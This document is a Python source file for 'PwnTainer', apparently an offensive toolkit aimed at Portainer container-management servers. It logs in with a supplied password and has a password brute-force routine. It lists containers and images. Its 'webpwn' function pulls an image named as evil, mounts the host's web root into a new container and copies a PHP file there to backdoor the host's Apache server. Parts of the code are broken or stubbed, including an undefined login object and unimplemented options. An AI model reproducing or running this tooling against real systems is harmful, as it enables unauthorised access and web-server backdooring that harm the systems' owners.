from multiprocessing import Pool
from pprint import pprint
from pyfiglet import Figlet
import argparse
import json
import sys
from terminaltables import AsciiTable

from modules import auth
from modules import containers
from modules import image

while True:
    font = Figlet(font='graffiti')
    print(font.renderText('PwnTainer'))
    break


def bruteforce(pw_list):
	with open(pw_list) as pass_list:
		passwords = pass_list.readlines()

	with Pool(4) as pool:
		results = pool.map(a.login, passwords)
		print(results)

def list_containers(host, token):
	cont = containers.Containers(host, 1, token)
	container_list = cont.list_containers()
	container_table = [["Name", "Image", "Network", "IPAddress", "Command"]]
	for con in container_list:
		data = []
		data.append(con['Names'][0])
		data.append(con['Image'])
		data.append(list(con['NetworkSettings']['Networks'].keys())[0])
		data.append(con['NetworkSettings']['Networks'][list(con['NetworkSettings']['Networks'].keys())[0]]['IPAddress'])
		data.append(con['Command'])
		container_table.append(data)
	table = AsciiTable(container_table)
	print(table.table)

def list_images(host, token):
	imgs = image.Image(host, 1, token)
	image_list = imgs.list_images()
	image_table = [["Name"]]
	for img in image_list:
		img_d = []
		img_d.append(img['RepoTags'][0])
		image_table.append(img_d)
	table = AsciiTable(image_table)
	print(table.table)


def check_image(name, host, token):
	img = image.Image(host, 1, token)
	images = []
	for imag in img.list_images():
		images.append(imag['RepoTags'])
	for im in images:
		if name in str(im[0]):
			return True
		else:
			pass

def pull_image(name, host, token):
	img = image.Image(host, 1, token)
	img.pull_image(name)

def webpwn(host, token):
	# Backdoors the hosts apache server
	webroot = "/var/www/html"
	pwntainer = containers.Containers(host, 1, token)
	print("[*] Creating pwntainer, evil container...")
	pwntainer.create_container("eviltainer", ["/var/www/html:/var/www/html/"])
	print("[+] Container created successfully\n[*] Starting the container...")
	pwntainer.start_container()
	print("[*] Starting host apache server poisoning...")
	pwntainer.exec_cmd(["cp", "/data/tmp.php", "/var/www/html/"])
	print("[+] Backdoor planted successfull...\n[*] Gaining command shell...")


def commads():
	_parser = argparse.ArgumentParser(prog='Pwntainer', usage='%(prog)s Host [options]' , description='Portainer exploitaion toolkit: ')
	_parser.add_argument('Host', help='Enter the address of the container running the portainer:192.168.25.101:9000 ')
        
	_authentication = _parser.add_argument_group('Authentication',)
	_authentication.add_argument('-p' , '--password', metavar=''  ,help='If the default username is admin, provide a passwor: ',  required=True)
	_authentication.add_argument('-l' , '--passlist', metavar=''  ,help='provide a passlist incase of brutefoce')

    
	_containers = _parser.add_argument_group('Information Gathering')
	_containers.add_argument('-C' , '--list-containers', dest='listc', help='List containers in the edpoint.', action='store_true')
	_containers.add_argument('-I' , '--list-images', dest='listi', help='List available images in the target endpoint. ', action='store_true')
	_containers.add_argument('-N' , '--list-networks' , help='List networks in the remote target endpoint. ', action ='store_true')

	_attack = _parser.add_argument_group('Attacks Surface')
	_attack.add_argument('-pj' , '--pwnwithJohn', metavar='')
	_attack.add_argument('-wp' , '--webpwn', dest="webpwn", help='Plant a backdoor in host\'s apache service', action='store_true')
	_attack.add_argument('-sp' , '--sshpwn', metavar='')
	_attack.add_argument('-a', '--all', metavar='')
        
	_commands = _parser.parse_args()
        
	if _commands.Host and _commands.password:
		_authenticate = auth.Auth(_commands.Host)
		_authenticate.login(_commands.password)
		print('\033[1;35;40m[*]Authenticated.')
                    
		_token = str(_authenticate.get_jwt())
		_images = image.Image(_commands.Host, 1, _token)

			
	if _commands.listc:
		print("[*] Getting a list of containers in the remote target...")
		list_containers(_commands.Host, _token)
		print("[+] Done!\n")

	if _commands.listi:
		print("[*] Getting a list of docker images present...")
		list_images(_commands.Host, _token)
		print("[+] Done!")

	if _commands.webpwn:
		print("[*] Checking if the evil pwntainer image exists...")
		if check_image("sethmwabe/pwntainer", _commands.Host, _token):
			print("[+] Pwntainer evil image exists")
		else:
			print("[-] Evil pwnstainer image not found, fetching...")
			pull_image("sethmwabe/pwntainer", _commands.Host, _token)
			print("[+]Image pull successful")
		webpwn(_commands.Host, _token)
	
def main():
	commads()
	
if __name__=="__main__":
	main()
